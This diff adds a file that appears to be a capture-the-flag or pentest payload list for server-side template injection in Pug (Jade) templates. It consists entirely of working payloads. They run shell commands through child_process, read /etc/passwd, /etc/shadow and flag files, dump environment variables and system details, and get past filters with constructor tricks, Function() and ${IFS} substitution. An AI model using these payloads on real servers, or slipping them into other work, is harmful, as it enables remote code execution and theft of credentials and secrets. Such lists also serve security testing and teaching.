@@ -1,0 +1,226 @@
+- var x = 7*7
+= 7*7
+#{7*7}
+!{7*7}
+- var x = 7*'7'
+#{7*'7'}
+!{7*'7'}
+#{global}
+#{process}
+#{root}
+#{self}
+#{global.process}
+#{process.mainModule}
+#{process.mainModule.require}
+#{process.mainModule.require('child_process')}
+#{process.mainModule.require('child_process').exec('id')}
+#{process.mainModule.require('child_process').exec('whoami')}
+#{process.mainModule.require('child_process').exec('cat /etc/passwd')}
+#{process.mainModule.require('child_process').exec('ls -la')}
+#{process.mainModule.require('child_process').exec('uname -a')}
+#{process.mainModule.require('child_process').exec('pwd')}
+#{process.mainModule.require('child_process').exec('env')}
+#{process.mainModule.require('child_process').exec('cat flag.txt')}
+#{process.mainModule.require('child_process').exec('ps aux')}
+#{process.mainModule.require('child_process').exec('ifconfig')}
+#{process.mainModule.require('child_process').exec('netstat -an')}
+#{process.mainModule.require('child_process').exec('cat /etc/shadow')}
+#{process.mainModule.require('child_process').execSync('id').toString()}
+#{process.mainModule.require('child_process').execSync('whoami').toString()}
+#{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}
+#{process.mainModule.require('child_process').execSync('ls -la').toString()}
+#{process.mainModule.require('child_process').execSync('uname -a').toString()}
+#{process.mainModule.require('child_process').execSync('pwd').toString()}
+#{process.mainModule.require('child_process').execSync('env').toString()}
+#{process.mainModule.require('child_process').execSync('cat flag.txt').toString()}
+#{process.mainModule.require('child_process').spawnSync('id').stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('whoami').stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString()}
+- var x = process.mainModule.require('child_process').execSync('id').toString()
+= x
+- var x = process.mainModule.require('child_process').execSync('whoami').toString()
+= x
+- var x = process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()
+= x
+- var x = process.mainModule.require('child_process').execSync('ls -la').toString()
+= x
+#{global.process.mainModule.require('child_process').execSync('id').toString()}
+#{global.process.mainModule.require('child_process').execSync('whoami').toString()}
+#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}
+#{global.process.mainModule.require('child_process').execSync('ls -la').toString()}
+#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}
+#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}
+#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}
+#{process.env}
+#{process.env.PATH}
+#{process.env.HOME}
+#{process.env.USER}
+#{process.env.SHELL}
+#{process.version}
+#{process.versions}
+#{process.platform}
+#{process.arch}
+#{process.release}
+#{process.config}
+#{process.pid}
+#{process.ppid}
+#{process.cwd()}
+#{process.execPath}
+#{process.argv}
+#{process.execArgv}
+#{process.memoryUsage()}
+#{process.uptime()}
+#{global.process.env}
+#{global.process.version}
+#{global.process.platform}
+#{global.process.cwd()}
+#{root.process}
+#{root.process.mainModule}
+#{root.process.mainModule.require}
+#{root.process.mainModule.require('child_process').execSync('id').toString()}
+!{global.process.mainModule.require('child_process').execSync('id').toString()}
+!{process.mainModule.require('child_process').execSync('whoami').toString()}
+!{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}
+!{process.mainModule.require('child_process').execSync('ls -la').toString()}
+!{process.mainModule.require('child_process').execSync('uname -a').toString()}
+!{process.mainModule.require('child_process').execSync('pwd').toString()}
+!{process.mainModule.require('child_process').execSync('env').toString()}
+!{process.mainModule.require('child_process').execSync('cat flag.txt').toString()}
+- var exec = process.mainModule.require('child_process').execSync
+= exec('id').toString()
+- var exec = process.mainModule.require('child_process').execSync
+= exec('whoami').toString()
+- var exec = process.mainModule.require('child_process').execSync
+= exec('cat /etc/passwd').toString()
+- var exec = global.process.mainModule.require('child_process').execSync
+= exec('id').toString()
+- var fs = process.mainModule.require('fs')
+= fs.readFileSync('/etc/passwd','utf8')
+- var fs = process.mainModule.require('fs')
+= fs.readFileSync('flag.txt','utf8')
+- var fs = process.mainModule.require('fs')
+= fs.readdirSync('/')
+- var fs = process.mainModule.require('fs')
+= fs.readdirSync('.')
+#{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
+#{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}
+#{process.mainModule.require('fs').readdirSync('/')}
+#{process.mainModule.require('fs').readdirSync('.')}
+!{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
+!{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}
+!{process.mainModule.require('fs').readdirSync('/')}
+!{process.mainModule.require('fs').readdirSync('.')}
+#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
+#{global.process.mainModule.require('fs').readFileSync('flag.txt','utf8')}
+#{global.process.mainModule.require('fs').readdirSync('/')}
+#{process.mainModule.constructor._load('child_process').execSync('id').toString()}
+#{process.mainModule.constructor._load('child_process').execSync('whoami').toString()}
+#{process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()}
+#{process.mainModule.constructor._load('child_process').execSync('ls -la').toString()}
+#{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}
+#{process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8')}
+#{process.mainModule.constructor._load('fs').readdirSync('/')}
+!{process.mainModule.constructor._load('child_process').execSync('id').toString()}
+!{process.mainModule.constructor._load('child_process').execSync('whoami').toString()}
+!{process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')}
+- var child_process = global.process.mainModule.constructor._load('child_process')
+= child_process.execSync('id').toString()
+- var child_process = global.process.mainModule.constructor._load('child_process')
+= child_process.execSync('whoami').toString()
+- var fs = global.process.mainModule.constructor._load('fs')
+= fs.readFileSync('/etc/passwd','utf8')
+#{process.mainModule.require('child_process').spawn('id')}
+#{process.mainModule.require('child_process').spawn('whoami')}
+#{process.mainModule.require('child_process').spawn('cat',['/etc/passwd'])}
+#{process.mainModule.require('child_process').spawn('ls',['-la'])}
+#{process.mainModule.require('child_process').fork('id')}
+#{process.mainModule.require('os').hostname()}
+#{process.mainModule.require('os').type()}
+#{process.mainModule.require('os').platform()}
+#{process.mainModule.require('os').arch()}
+#{process.mainModule.require('os').release()}
+#{process.mainModule.require('os').uptime()}
+#{process.mainModule.require('os').loadavg()}
+#{process.mainModule.require('os').totalmem()}
+#{process.mainModule.require('os').freemem()}
+#{process.mainModule.require('os').cpus()}
+#{process.mainModule.require('os').networkInterfaces()}
+#{process.mainModule.require('os').userInfo()}
+#{process.mainModule.require('os').homedir()}
+#{process.mainModule.require('os').tmpdir()}
+!{process.mainModule.require('os').hostname()}
+!{process.mainModule.require('os').userInfo()}
+!{process.mainModule.require('os').networkInterfaces()}
+- var os = process.mainModule.require('os')
+= os.hostname()
+- var os = process.mainModule.require('os')
+= os.userInfo()
+- var os = process.mainModule.require('os')
+= os.networkInterfaces()
+#{require('child_process').execSync('id').toString()}
+#{require('child_process').execSync('whoami').toString()}
+#{require('child_process').execSync('cat /etc/passwd').toString()}
+#{require('child_process').execSync('ls -la').toString()}
+#{require('child_process').execSync('uname -a').toString()}
+#{require('child_process').execSync('pwd').toString()}
+#{require('child_process').execSync('env').toString()}
+#{require('child_process').execSync('cat flag.txt').toString()}
+#{require('fs').readFileSync('/etc/passwd','utf8')}
+#{require('fs').readFileSync('flag.txt','utf8')}
+#{require('fs').readdirSync('/')}
+#{require('fs').readdirSync('.')}
+!{require('child_process').execSync('id').toString()}
+!{require('child_process').execSync('whoami').toString()}
+!{require('child_process').execSync('cat /etc/passwd').toString()}
+!{require('fs').readFileSync('/etc/passwd','utf8')}
+!{require('fs').readFileSync('flag.txt','utf8')}
+- var exec = require('child_process').execSync
+= exec('id').toString()
+- var exec = require('child_process').execSync
+= exec('whoami').toString()
+- var fs = require('fs')
+= fs.readFileSync('/etc/passwd','utf8')
+#{process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString()}
+#{process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString()}
+#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString()}
+#{process.mainModule.require('child_process').execSync('calc').toString()}
+#{process.mainModule.require('child_process').execSync('cmd /c calc').toString()}
+#{process.mainModule.require('child_process').execSync('cmd /c dir').toString()}
+#{process.mainModule.require('child_process').execSync('powershell.exe').toString()}
+#{process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString()}
+!{process.mainModule.require('child_process').execSync('cmd /c whoami').toString()}
+#{process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString()}
+#{process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString()}
+- var exec = process.mainModule.require('child_process').execSync
+= exec('cmd /c whoami').toString()
+#{process.mainModule.require('net').isIP('127.0.0.1')}
+#{process.mainModule.require('dns').lookup('localhost')}
+#{process.mainModule.require('http').request}
+#{process.mainModule.require('https').request}
+#{process.mainModule.require('url').parse('http://example.com')}
+#{process.mainModule.require('path').resolve('/')}
+#{process.mainModule.require('path').dirname('/etc/passwd')}
+#{process.mainModule.require('crypto').getHashes()}
+#{process.mainModule.require('crypto').getCiphers()}
+- var util = process.mainModule.require('util')
+= util.inspect(process)
+- var util = process.mainModule.require('util')
+= util.inspect(global)
+#{process.mainModule.require('util').inspect(process.env)}
+!{process.mainModule.require('util').inspect(process.env)}
+#{Function('return this')()}
+#{Function('return process')()}
+#{Function('return global')()}
+#{Function('return process.mainModule.require("child_process").execSync("id").toString()')()}
+#{Function('return process.mainModule.require("child_process").execSync("whoami").toString()')()}
+#{Function('return process.mainModule.require("child_process").execSync("cat /etc/passwd").toString()')()}
+!{Function('return process.mainModule.require("child_process").execSync("id").toString()')()}
+- var x = Function('return process.mainModule.require("child_process").execSync("id").toString()')()
+= x
+#{constructor.constructor('return process')()}
+#{constructor.constructor('return global')()}
+#{constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}
+#{constructor.constructor('return process.mainModule.require("child_process").execSync("whoami").toString()')()}
